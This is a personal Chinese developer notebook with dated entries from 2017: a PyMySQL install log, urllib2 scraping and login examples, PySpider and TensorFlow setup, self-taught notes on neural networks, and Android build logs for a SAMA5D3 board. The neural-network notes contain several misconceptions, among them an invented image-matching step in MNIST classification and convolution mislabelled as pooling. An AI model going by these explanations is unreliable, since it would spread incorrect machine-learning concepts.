copying build/lib/pymysql/tests/__init__.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_cursor.py -> build/bdist.linux-x86_64/egg/pymysql/tests
copying build/lib/pymysql/tests/test_basic.py -> build/bdist.linux-x86_64/egg/pymysql/tests
creating build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty
creating build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/dbapi20.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_nonstandard.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/capabilities.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/__init__.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_dbapi20.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_capabilities.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb
copying build/lib/pymysql/tests/thirdparty/__init__.py -> build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty
creating build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/SERVER_STATUS.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/ER.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/CR.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/FIELD_TYPE.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/__init__.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/FLAG.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/COMMAND.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/constants/CLIENT.py -> build/bdist.linux-x86_64/egg/pymysql/constants
copying build/lib/pymysql/times.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/err.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/__init__.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/_socketio.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/_compat.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/converters.py -> build/bdist.linux-x86_64/egg/pymysql
copying build/lib/pymysql/util.py -> build/bdist.linux-x86_64/egg/pymysql
byte-compiling build/bdist.linux-x86_64/egg/pymysql/cursors.py to cursors.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/charset.py to charset.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/connections.py to connections.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/optionfile.py to optionfile.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_issues.py to test_issues.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_connection.py to test_connection.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_DictCursor.py to test_DictCursor.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_optionfile.py to test_optionfile.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_nextset.py to test_nextset.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_load_local.py to test_load_local.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_err.py to test_err.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_converters.py to test_converters.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_SSCursor.py to test_SSCursor.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/base.py to base.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/__init__.py to __init__.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_cursor.py to test_cursor.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/test_basic.py to test_basic.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/dbapi20.py to dbapi20.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_nonstandard.py to test_MySQLdb_nonstandard.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/capabilities.py to capabilities.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/__init__.py to __init__.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_dbapi20.py to test_MySQLdb_dbapi20.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_capabilities.py to test_MySQLdb_capabilities.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/tests/thirdparty/__init__.py to __init__.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/SERVER_STATUS.py to SERVER_STATUS.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/ER.py to ER.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/CR.py to CR.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/FIELD_TYPE.py to FIELD_TYPE.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/__init__.py to __init__.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/FLAG.py to FLAG.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/COMMAND.py to COMMAND.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/constants/CLIENT.py to CLIENT.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/times.py to times.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/err.py to err.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/__init__.py to __init__.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/_socketio.py to _socketio.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/_compat.py to _compat.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/converters.py to converters.cpython-34.pyc
byte-compiling build/bdist.linux-x86_64/egg/pymysql/util.py to util.cpython-34.pyc
creating build/bdist.linux-x86_64/egg/EGG-INFO
copying PyMySQL.egg-info/PKG-INFO -> build/bdist.linux-x86_64/egg/EGG-INFO
copying PyMySQL.egg-info/SOURCES.txt -> build/bdist.linux-x86_64/egg/EGG-INFO
copying PyMySQL.egg-info/dependency_links.txt -> build/bdist.linux-x86_64/egg/EGG-INFO
copying PyMySQL.egg-info/top_level.txt -> build/bdist.linux-x86_64/egg/EGG-INFO
zip_safe flag not set; analyzing archive contents...
pymysql.tests.__pycache__.base.cpython-34: module references __file__
pymysql.tests.__pycache__.test_load_local.cpython-34: module references __file__
creating dist
creating 'dist/PyMySQL-0.7.11-py3.4.egg' and adding 'build/bdist.linux-x86_64/egg' to it
removing 'build/bdist.linux-x86_64/egg' (and everything under it)
Processing PyMySQL-0.7.11-py3.4.egg
creating /usr/local/lib/python3.4/dist-packages/PyMySQL-0.7.11-py3.4.egg
Extracting PyMySQL-0.7.11-py3.4.egg to /usr/local/lib/python3.4/dist-packages
Adding PyMySQL 0.7.11 to easy-install.pth file

Installed /usr/local/lib/python3.4/dist-packages/PyMySQL-0.7.11-py3.4.egg
Processing dependencies for PyMySQL==0.7.11
Finished processing dependencies for PyMySQL==0.7.11
成功安装，python3.4交互界面输入：import pymysql.cursors 成功使用
详细的api使用介绍和例子在 github 下载页有！！












20170425
python爬虫学习：
简单扒下百度例子：
import urllib2
response = urllib2.urlopen("http://www.baidu.com")	//urlopen的函数完整格式 urlopen(url, data, timeout)
print response.read()		//显示扒下所有内容 即网页的所有内容
print response			//显示内容的属性，显示如下：
				//<addinfourl at 139764017715104 whose fp = <socket._fileobject object at 0x7f1d5b1a2bd0>>
也可以这样
import urllib2
request = urllib2.Request("http://www.baidu.com")	//实际操作中修改request参数比，一次次修改urlopen里的内容有效率多
response = urllib2.urlopen(request)	
print response.read()

post方式例子：给网站输入用户名和密码然后的骚登陆后数据的例子
import urllib
import urllib2
values = {"username":"1016903103@qq.com","password":"XXXX"}
data = urllib.urlencode(values) 
url = "https://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn"
request = urllib2.Request(url,data)
response = urllib2.urlopen(request)
print response.read()
也可以这样
import urllib
import urllib2
values = {}
values['username'] = "1016903103@qq.com"
values['password'] = "XXXX"
data = urllib.urlencode(values) 
url = "http://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn"
request = urllib2.Request(url,data)
response = urllib2.urlopen(request)
print response.read()

get方式例子：同样给网站输入用户名和密码然后的骚登陆后数据的例子
import urllib
import urllib2
values={}
values['username'] = "1016903103@qq.com"
values['password']="XXXX"
data = urllib.urlencode(values) 
url = "http://passport.csdn.net/account/login"
geturl = url + "?"+data
request = urllib2.Request(geturl)
response = urllib2.urlopen(request)
print response.read()
print geturl		//看看geturl到底变怎样？如下：
			//http://passport.csdn.net/account/login?username=1016903103%40qq.com&password=XXXX
更多基础和重点内容http://cuiqingcai.com/1052.html
正则表达式是重点。

安装PySpider爬虫框架：
sudo apt-get install python python-dev python-distribute python-pip libcurl4-openssl-dev libxml2-dev libxslt1-dev python-lxml //依赖包
sudo apt-get install phantomjs		//安装phantomjs 一个无界面的,可脚本编程的WebKit浏览器引擎，可处理网页数据的js脚本
sudo pip install pyspider		//安装pyspider，注意到pip工具 就是上述python-pip工具 
pyspider all		//启动pyspider，并启用所有组件，
firefox浏览器输入 http://localhost:5000 进入pyspider界面

phantomjs：浏览器引擎，一般用于解析js脚本内容
phantomjs helloworld.js		//直接运行js 脚本是使用方式

selenium： 用于桥接phantomjs到python 	
sudo pip install selenium

PyQuery：
sudo pip install pyquery

jQuery：










20170426
机器学习：（包含）
	supervised leaning 监督学习 ：根据 输入 预测 输出
		regression：预测结果
		classification：分类内容
	reinforcement leaning 强化学习： 做判断，决策
	unsupervised leaning 非监督学习：挖据有关输入的规律
人工智能 = 深度学习+强化学习    
强化学习 就是 训练最优大脑模型 实时训练 相当于人的最终大脑决策 判断， 
深度学习 相当于脑皮层 神经 对外部信息的处理。
	也称 supervised leaning 监督学习，
所以人工智能就是强化学习 加上深度学习 ，
比如alphaGo就是强化学习来负责决策，CNN来负责处理棋子 下棋位置的范围确定,MCTS树最后结合来搜索
这里讨论的是xxNN模型例子都是，深度学习的模型：
原理缥缈，直接学习使用 tensorflow 框架（做过alphago） 
下载安装 （只使用cpu，针对python2.7的版本）
sudo pip2 install --upgrade https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.8.0-cp27-none-linux_x86_64.whl
教程：
https://my.oschina.net/yilian/blog/664632
教程的范例都会在tensorflow_test里示范学习一遍
1,入门，线性拟合实验，linear_fitting_test.py
2,CNN卷积神经网络： CNN_test.py 
3,自修改的卷积神经网络： CNN_test2.py
4,使用可视化界面观察训练情况tensorboard，（安装tensorflow时就已经安装了）
	tensorboard --logdir=/tmp/logs
	Starting TensorBoard 16 on port 6006
	(You can navigate to http://0.0.0.0:6006)	//浏览器打开 http://0.0.0.0:6006 就可以开始监测
	但是要使用tensorboard监测，代码里也要做相对应的设置 CNN_test3_with_tensorboard.py
	出错，是关于tensorboard的api 的调用出现了问题，以后再处理！！
5，
9，RNN/LSTM循环神经网络长短期记忆网络使用 RNN_test.py
10,最强网络 RSNN深度残差网络 平均准确率96-99% RSNN_test.py 卡死出错












20170428
从最基本的例子 CNN_test.py 深入 深度学习的 基础原理和概念
import input_data	//下载了一个例子数据包，分成两部分：60000行的训练数据集（mnist.train）和10000行的测试数据集（mnist.test）。
			//是一个 用于识别阿拉伯数字图片 的例子数据包 （0~9十个阿拉伯数字） 
			//训练数据用于训练模型，测试数据和训练数据其实是相同内容，
			//但独立出来是避免使用曾经用于训练模型的数据来检测模型，更公平得到模型的准确性
mnist = input_data.read_data_sets("/tmp/data/", one_hot=True)
			//这里是读取这个数据包的数据
			//每个数据包有两个数据集，
			//每个数据集都有两部分组成，一个是图片包，一个是对应的标签包
			//训练数据集有一个含60000张图片的图片包，和对应一个含60000行便签的标签包
			//测试数据集有一个含10000张图片的图片包，和对应一个含10000行便签的标签包		
			//每张图片对应一个 10维向量的便签，比如说：
			//图片包第200张图片显示”5“，便签包第200条10维向量对应为 ([0,0,0,0,0,1,0,0,0,0])
最基础的学习原理（矩阵乘法方程）：
使用线性回归的方法，就是通过提供的样本来训练出一个可以描述样本行为的 矩阵乘法方程，也叫训练出一种合理的特定”思维“
例子数据包每张图片是 28X28 分辨率的黑白图片，那每张图片可以表示为 28x28 = 784 维向量 x，对应的标签为 y
我们引入一个可以用于描述特征的 10×784 矩阵W， 和偏移向量量b  还引入一个特征标签10维向量 Y 
执行矩阵乘法： Y = W × x + b  （经过多样本训练，得到合理的 矩阵乘法 方程，最终W 和b稳定到一定区域，这个过程也称拟合，）
	Y1      W11x1  + W12x2  + W13x3  + ..... W1784x784  + b1
	Y2      W21x1  + W22x2  + W23x3  + ..... W2784x784  + b2
	Y3      W31x1  + W32x2  + W33x3  + ..... W3784x784  + b3
	Y4      W41x1  + W42x2  + W43x3  + ..... W4784x784  + b4
	Y5   =  W51x1  + W52x2  + W53x3  + ..... W5784x784  + b5
	Y6      W61x1  + W62x2  + W63x3  + ..... W6784x784  + b6
	Y7      W71x1  + W72x2  + W73x3  + ..... W7784x784  + b7
	Y8      W81x1  + W82x2  + W83x3  + ..... W8784x784  + b8
	Y8      W91x1  + W92x2  + W93x3  + ..... W9784x784  + b9
	Y10     W101x1 + W102x2 + W103x3 + ..... W10784x784 + b10		
即一张图片 x 通过特征矩阵 W 处理后，提取到特征便签 Y
再把特征便签归一化的预测标签 y_ = softmax（Y）
假如模型不断训练，特征矩阵 W 稳定到不需要改变，那么预测标签 y_ 与 x 对应的真实标签 y 应该一致！！！
如果不一致，y与y_就有误差，
通过统计误差，然后运用交叉熵等数学方法，得到修正量，反馈更新特征矩阵W和偏移向量b，
模型又进化成长了点，
通过不同图片 x 的训练 ，模型最终成长到一个接近完美的状态，这时，算出的y_与y极大多数一致，即表示模型基本能识别每一个图片上的数字
但仅仅y_与y一致，并不百分百认为识别对图片，
训练好的模型识别一张图片的过程是：
	得到图片的y_,y_与十中y中的一个吻合，基本确认图片数字与y对应的数字一样，
	然后模型继续取出 y 对应的那张暂存在模型里参照图片， 与正在识别的图片 执行布尔运算 （就是对俩个784维向量执行按维与运算）
	吻合程度超过75%，那么就完全确认正确图片上的数字！！！

欠拟合：训练出来的 矩阵乘法方程，与样本不能很好地吻合，不能很好形成合适的”思维“
过拟合：训练出来的的 矩阵乘法方程，只与已知的训练样本完全吻合，也不能形成合理的”思维“

加权回归：
	与线性回归的区别是，线性回归会考虑每一个样本，为训练出合适的 矩阵乘法方程 做贡献，
	而加权回归是，重视某部分样品对训练方程时的贡献，而忽略或减少某些样本对训练方程时的影响，所以训练的是变种 矩阵乘法方程

feedfroward模型神经网络:(FNN),而不是完整的CNN模型,对于CNN认识的补充有待讨论)：
	上述学习原理中，我们讲述是训练拟合一个合理的矩阵乘法方程（思维） Y = W × x + b，
		当这个 思维 被训练得相当成熟了，给机器 一个”信息：x“，根据 思维，机器做出一个”行为：y“
	这种思维只是一个 矩阵乘法方程，往往被视为思维简单，不管被训练得多久，最后应用时，做出的行为准确程度都不会太高！！
	如果现在改成以下方式：
	a1 = Wa1 × x + ba1，训练一个 向量乘法 方程提取抽象信息a1，即训练更新 特征向量Wa1，和偏移向量ba1
	a2 = Wa2 × x + ba2，训练一个 向量乘法 方程提取抽象信息a2，即训练更新 特征向量Wa2，和偏移向量ba2
	a3 = Wa3 × x + ba3，训练一个 向量乘法 方程提取抽象信息a3，即训练更新 特征向量Wa3，和偏移向量ba3
	a4 = Wa4 × x + ba4，训练一个 向量乘法 方程提取抽象信息a4，即训练更新 特征向量Wa4，和偏移向量ba4
	a5 = Wa5 × x + ba5，训练一个 向量乘法 方程提取抽象信息a5，即训练更新 特征向量Wa5，和偏移向量ba5
	可以看出，每个信息 x向量 都会得到 5个抽样信息组成的 a向量（a1,a2,a3,a4，a5）
	接着上述例子，一个样本信息集有60000个信息x，即60000个 x向量，就有60000个5维a向量
	然后继续：
	c1 = Wc1 × a + bc1，训练一个 向量乘法 方程提取抽象信息c1，即训练更新 特征向量Wc1，和偏移向量bc1
	c2 = Wc2 × a + bc2，训练一个 向量乘法 方程提取抽象信息c2，即训练更新 特征向量Wc2，和偏移向量bc2
	c3 = Wc3 × a + bc3，训练一个 向量乘法 方程提取抽象信息c3，即训练更新 特征向量Wc3，和偏移向量bc3
	c4 = Wc4 × a + bc4，训练一个 向量乘法 方程提取抽象信息c4，即训练更新 特征向量Wc4，和偏移向量bc4
	c5 = Wc5 × a + bc5，训练一个 向量乘法 方程提取抽象信息c5，即训练更新 特征向量Wc5，和偏移向量bc5
	c6 = Wc6 × a + bc6，训练一个 向量乘法 方程提取抽象信息c6，即训练更新 特征向量Wc6，和偏移向量bc6
	可以看出，每个a向量 都会得到 6个抽样信息组成的 c向量（c1,c2,c3,c4,c6）
	一个样本信息集有60000个信息x，就有60000个5维a向量，就有60000个6维c向量
	然后继续：
	Y = Wd × c + bd，训练一个 矩阵乘法 方程做出行为Y，即训练更新 特征矩阵Wd，和偏移向量bd
	最终通过抽象信息c做出行为Y
	比起简单的 x -> Y 思维，这里是 x -> a -> c -> Y 多层思维！
	每一个 向量乘法方程 视为一个神经元！
	那 5个 获取抽象信息a的 向量乘法方程 共同组成第一神经层
	那 6个 获取抽象信息c的 向量乘法方程 共同组成第二神经层
	每一条信息x 都处在输入层
	最后得到的行为Y 处在输出层
	那么：输入层x， 第一神经a， 第二神经层b， 输出层Y 组成的就是 一个神经网络
	发现每一层都是一个 矩阵方程(多个向量方程组成一个矩阵方程)
	上述是一个典型的神经网络例子，当然，实际的神经网络可以更多层，更复杂。
	一般矩阵乘法神经网络用于机械视觉，机械听觉类工作，例如识别图片内容，分析一首MP3属于什么类型音乐等等
	有一种改进的方法,可以减少计算复杂程度!!!
		就是对于上述的 所有 向量乘法方程 都加入同一个sigmond算子 或者 同一个tanh算子!!
		即都加 f(Z) = sigmond(z) 或者都加 f(z) = tanh(z)
		例如:
			a2 = f ( Wa2 × x + ba2 )
			....
			c5 = f ( Wc5 × a + bc5 )
			....
		如果是f()是tanh()这时得到的 a1,a2,....c1,c2,... 大部分要不是深度接近1,要深度接近近-1,即在[-1,1]区间
			即得到的a和c向量都偏简单比如: 向量a ={1,-0.9,1,0.8,-1},....
		如果是f()是sigmond这时得到的 a1,a2,....c1,c2,... 大部分要不是深度接近0,要深度接近近1,即在[0,1]区间
			即得到的a和c向量都偏简单比如: 向量a ={1,0.8,0,0.9,0},....
		这样再投入下一层网络的计算,计算量变得相当少,
		而且这种技巧被证明不影响模型的训练!!!
	还有一种算子叫 softmax() 与归一化相关的算子
	前向传导:就是上述的 向量x经一层层网络得到y
	反向传导:就是根据 实际推得y 和 预期y 的方差,往后修正网络中的各个W 和 b 的过程
				
			

卷积神经网络概念 （CNN）:
	参考:	http://blog.csdn.net/zkl99999/article/details/46805453
	   	https://www.zhihu.com/question/34681168
	现实中,的图片样品或者声音样品,如果使用传统的froward,那么就需要大量 矩阵方程,需要拟合大量的 大型W矩阵和b向量
	CNN的思想是:前期设立几层,通过卷积核提取样本特征!,最后得到多份的相互独立的特征碎片
		    后面的几层就是 统计和使用feedfroward模型等传统手段归类
	相比于feedfroward模型,
		CNN是多了一个提取出多份样本特征的过程,然后训练识别样本特征组成的输入向量.
		但是 feedfroward模型 ,直接把样本当成一个输入向量,然后训练,
		这么一比较就发现了 CNN 训练的时间成本低,而且,准确率不比feedfroward模型差!!
	一个重要的概念是 卷积核,其实就是一个nxn的小矩阵,
		卷积核用法:
			卷积核从样图片左上方开始,nxn卷积核 矩阵乘以 此刻所在nxn像素区域,
			得到的一个加权平均值,为新特征图的新的一个像素点!!
			(上述加权平均得到平均值的过程叫 池化)
			然后卷积核在样图片向右移动一个像素点,重复动作得到新特征图第二个像素点...
			卷积核移动轨迹从左到右,从上到下
		使用例子:
		例如一张300x300的样图image,通过一个 5x5的卷积核换算,得到一张296x296 的特征图map
		第一层conv为A,有10个5x5卷积核,那么这张image对应A层就有 10张296x296特征图A_map
		第二层conv为B,有6个100x100卷积核,那么A层每张map在B层又分别有 6张193x193特征图B_map,理应60张B_map
			然而事实上不一定60张B_map,可以有限定有30张B_map,这就是说随机某些A_map并没有透过某些卷积核生成B_map
		第三层conv为C,有6个100x100卷积核,那么B层每张map在C层又分别有 6张92x92特征图C_map,理应共30x6=180张C_map
			然而只取其中60张C_map
		最后一层conv为D 有5个92x92卷积核,那么C层每张map在d层又分别有 5张1x1特征图D_map,理应共60x5=3000张D_map
			最后一层,会全部使用300张1x1特征图D_map,	
			由于1x1特征图,所以直接构造成 300维的向量,所以最后一层的这种变换叫做 全连接(full connecttion)
		以上就是取特征的过程,
		最后就类似 feedfroward模型 方法训练300维的向量!!! D层相当于输入层
		layer1 有 200 个300x1 向量方程,300维向量经过layer1 得到1个200维向量
		output 层 1  个200x50矩阵方程,最终得到一个 50维向量,
			归一化后最后指出图片里是一辆汽车
		统计以下 要训练的参数!!!
		A层(10x5x5)+10=260, B层(6x100x100)+6=60006, C层(6x100x100)+6=60006, D层(5x92x92)+5=8469
		layer1 300x200+200=60200, ouput 200x50+50=10050
		共 198991 个需要训练参数
	对比 feedfroward模型的一个例子!!!
		同样一张300x300的样图image,相当于300x300=90000维向量
		layer1 有 200 个90000x1向量方程,90000维向量经过layer1 得到1个200维向量
 		output 层 1  个200x50矩阵方程,最终得到一个 50维向量,
		统计以下 要训练的参数!!!
		layer1 90000x200+200=18000200, ouput 200x50+50=10050
		共 18010250 个需要训练的参数,
		即使不要 layer1,直接转成 50维向量,也要 90000x50+50=4500050个训练参数!!
		都比 CNN 训练的参数要多!!!
		
循环神经网络概念 （RNN）：
	即过去的行为可以影响此刻行为的神经网络结构，以3层feedfroward神经模型 类比讲解 简单的3层经典RNN结构
	3层CNN即：输入层，第一层神经网络（假设只有4个神经元），输出层：从上述知道：
		第一神经网络对应的矩阵乘法方程有：
		a1 = Wa1 × x + ba1，训练一个矩阵乘法方程提取抽象信息a1，即训练更新特征矩阵Wa1，和偏移向量ba1
		a2 = Wa2 × x + ba2，训练一个矩阵乘法方程提取抽象信息a2，即训练更新特征矩阵Wa2，和偏移向量ba2
		a3 = Wa3 × x + ba3，训练一个矩阵乘法方程提取抽象信息a3，即训练更新特征矩阵Wa3，和偏移向量ba3
		a4 = Wa4 × x + ba4，训练一个矩阵乘法方程提取抽象信息a4，即训练更新特征矩阵Wa4，和偏移向量ba4
		输出层对应的矩阵乘法方程有：
		Y = Wc × a + bc，训练一个矩阵乘法方程做出行为Y，即训练更新特征矩阵Wc，和偏移向量bc
		经过训练后，经过这种传递关系 由x最终得到对应Y
	而 经典RNN 除了由此刻的x外，还又之前的x，共同得到此刻的 Y 的
		因此输入层 还是 x 不变
		第一神经网络对应的方程一般是这样，
		a1 = Wa1 × |x，<a-| + ba1，训练一个矩阵乘法方程提取抽象信息a1，即训练更新特征矩阵Wa1，和偏移向量ba1
		a2 = Wa2 × |x，<a-| + ba2，训练一个矩阵乘法方程提取抽象信息a2，即训练更新特征矩阵Wa2，和偏移向量ba2
		a3 = Wa3 × |x，<a-| + ba3，训练一个矩阵乘法方程提取抽象信息a3，即训练更新特征矩阵Wa3，和偏移向量ba3
		a4 = Wa4 × |x，<a-| + ba4，训练一个矩阵乘法方程提取抽象信息a4，即训练更新特征矩阵Wa4，和偏移向量ba4
		<a- 我暂且这样表示是 上一次的 x求Y 过程中 得到的的中间量 a（a1,a2,a3,a4）
		|x，<a-| 表示 x 与上一次的 a 的组成的矩阵
		也就说，除了输入层的x参数作为输入参数外，还有上次得到的a
		输出层对应的矩阵乘法方程有：
		Y = Wc × a + bc，训练一个矩阵乘法方程做出行为Y，即训练更新特征矩阵Wc，和偏移向量bc
		输出层的形式保持不变，就是这样子，使得上一次的输入直接影响到此刻行为的结果	 
	RNN的变种非常多，上述是最简单模型也是最没有应用前景的模型
	迄今应用最为广泛是RNN模型是基于 LSTM单元的模型
	参考：http://colah.github.io/posts/2015-08-Understanding-LSTMs/
	http://blog.csdn.net/Dark_Scope/article/details/47056361
	http://blog.csdn.net/u014595019/article/details/52605693
	重点是，之前的都是一个矩阵乘法方程作为一神经元
	但是lstm 使用多个矩阵乘法方程组成特殊神经元，其中有三个矩阵乘法方程作为“门”通过归一化后得到的1后0来判断是否输入 x 和 <a- 信息
		到神经元核的矩阵乘法方程，也判断是否传递到下一次的 工作循环去，
深度神经网络概念 （DNN）：
	这个概念比较广泛，其实就是各种基础神经网络的混合，还有往往是多层网络！！











20170503
继续搭建安卓环境： （sama5d35ek为例！）
获取安卓源码：
$ mkdir android4sam_v4.4
$ cd android4sam_v4.4
$ repo init -u git://github.com/Android4SAM/platform_sammanifest.git -b android4sam_v4.4
$ repo sync
下了两周 （50GB啊 重点是 .repo 文件夹是重点不能删）！
配置编译！！
$ . build/envsetup.sh
$ lunch sama5d3-eng	//就是这里配置成 sama5d3的， 可能配置成 sama5d4的也在这里
$ make	//编译
$ mkubi_image -b sama5d3 	//做成ubi格式系统
烧录：
下载了对应的安卓demo镜像测试烧录：
修改 sama5d3ek_nandflash.sh 的samba命令路径 和 对应烧录usb口ttyACM1
sudo /home/infortech-ubuntu-1404/SAM9X35/tools/sama2.16/sam-ba_cdc_linux/sam-ba /dev/ttyACM1 AT91SAMa5d3x-EK sama5d3ek_nandflash.tcl > logfile.log 2>&1
然后执行sh烧录。
成功运行，
然后把源码编译出的文件系统代入测试：
首先，从demo发现有4种文件系统：
recovery
systemfs
datafs
cachefs
而源码编译出来的只有 systemfs 和 datafs
system_ubifs-SAMA5D3-ANDROID-4.2.2_r1.1.img
userdata_ubifs-SAMA5D3-ANDROID-4.2.2_r1.1.img
另外，还有两种fs文件并没有编译出来
替换demo对应的，成功烧录运行！！

编译安卓文件系统问题log;
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ . build/envsetup.sh
including device/atmel/sama5d3isi/vendorsetup.sh
including device/atmel/sama5d3/vendorsetup.sh
including device/generic/armv7-a-neon/vendorsetup.sh
including device/generic/armv7-a/vendorsetup.sh
including device/generic/mips/vendorsetup.sh
including device/generic/x86/vendorsetup.sh
including sdk/bash_completion/adb.bash

infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ lunch sama5d3-eng
/bin/bash: bison: 未找到命令
build/core/config.mk:344: *** Error: could not find jdk tools.jar, please install JDK6, which you can download from java.sun.com。 停止。
** Don't have a product spec for: 'sama5d3'
** Do you have the right repo manifest?
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ sudo apt-get install bison

infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ lunch sama5d3-eng
build/core/config.mk:344: *** Error: could not find jdk tools.jar, please install JDK6, which you can download from java.sun.com。 停止。
** Don't have a product spec for: 'sama5d3'
** Do you have the right repo manifest?
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ 
安装java6 http://blog.csdn.net/neuxiang/article/details/41956557

infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ lunch sama5d3-eng
============================================
PLATFORM_VERSION_CODENAME=REL
PLATFORM_VERSION=4.2.2
TARGET_PRODUCT=sama5d3
TARGET_BUILD_VARIANT=eng
TARGET_BUILD_TYPE=release
TARGET_BUILD_APPS=
TARGET_ARCH=arm
TARGET_ARCH_VARIANT=armv7-a
HOST_ARCH=x86
HOST_OS=linux
HOST_OS_EXTRA=Linux-3.19.0-25-generic-x86_64-with-Ubuntu-14.04-trusty
HOST_BUILD_TYPE=release
BUILD_ID=JDQ39B
OUT_DIR=out
============================================
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ make
............................................................
/bin/bash: flex: 未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ sudo apt-get install flex

/usr/include/stdlib.h:760:34: fatal error: bits/stdlib-bsearch.h: No such file or directory
